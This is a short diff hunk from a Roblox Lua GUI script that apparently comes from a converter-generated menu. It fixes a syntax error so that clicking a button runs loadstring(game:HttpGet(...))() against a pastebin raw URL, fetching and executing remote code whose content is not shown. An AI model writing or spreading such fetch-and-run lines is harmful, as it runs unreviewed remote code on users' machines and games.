@@ -285,7 +285,7 @@ local function LRZNRN_fake_script() -- TextButton_5.LocalScript
 	local script = Instance.new('LocalScript', TextButton_5)
 
 	script.Parent.MouseButton1Down:connect(function()
-		loadstring(game:HttpGet("https://pastebin.com/raw/YSL3xKYU")()
+		loadstring(game:HttpGet("https://pastebin.com/raw/YSL3xKYU"))()
 	end)
 end
 coroutine.wrap(LRZNRN_fake_script)()
